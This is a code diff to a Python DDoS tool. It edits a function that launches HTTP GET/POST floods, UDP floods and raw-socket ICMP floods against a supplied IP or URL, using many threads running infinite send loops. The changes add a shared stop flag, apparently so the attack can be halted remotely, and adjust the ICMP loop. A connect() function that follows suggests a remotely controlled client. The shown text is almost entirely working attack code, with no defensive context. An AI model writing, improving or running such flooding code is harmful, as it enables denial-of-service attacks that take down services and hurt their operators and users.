@@ -23,6 +23,7 @@ def ddos(mode:str, address:str): #address : ip or url
     each method will define a method "attack", which will be execute countless times by thread and infinite loop
     the "attack" method require a ip or url
     '''
+    global ddos_flag
     print("[*]Start attack")
     if mode == 'httpGETflood' or mode == 'httpflood' or mode == 'httpPOSTflood': # httpflood method : only http GET flood
         from urllib import request,parse
@@ -33,7 +34,6 @@ def ddos(mode:str, address:str): #address : ip or url
         context = _create_unverified_context()
         data = bytes(parse.urlencode(dict), encoding='utf8')
         def attack(url):
-            global ddos_flag
             while True:
                 if ddos_flag: return
                 try:
@@ -53,6 +53,7 @@ def ddos(mode:str, address:str): #address : ip or url
             port = 1
             sent = 0
             while True:
+                if ddos_flag: return
                 sock.sendto(byte, (ip, port))
                 sent = sent + 1
                 print(f"[*] Sent " + str(sent) + " packet to " + ip + " through port " + str(port))
@@ -62,7 +63,7 @@ def ddos(mode:str, address:str): #address : ip or url
     elif mode == 'ICMPflood':
         from array import array
         from struct import pack, unpack
-        from time import time
+        from time import time, sleep
 
         header = pack('bbHHh', 8, 0, 0, 12345, 0)  # create header
         data = pack('d', time())  # create data, random time
@@ -81,9 +82,11 @@ def ddos(mode:str, address:str): #address : ip or url
         Sock = socket(AF_INET, SOCK_RAW, getprotobyname("icmp"))
         def attack(ip):
             while True:
+                if ddos_flag: return
                 Sock.sendto(icmp_data , (ip, 0))
-                recv_packet, addr = Sock.recvfrom(1024)
-                print('[*]ttl: ' + unpack("!BBHHHBBHII", recv_packet[:20])[5])
+                sleep(0.5)
+                # recv_packet, addr = Sock.recvfrom(1024)
+                print('[*] packet sent')
     print('[*]Attack:', address)
     for i in range(Threads): Thread(target=attack, args=(address,)).start()
 def connect():
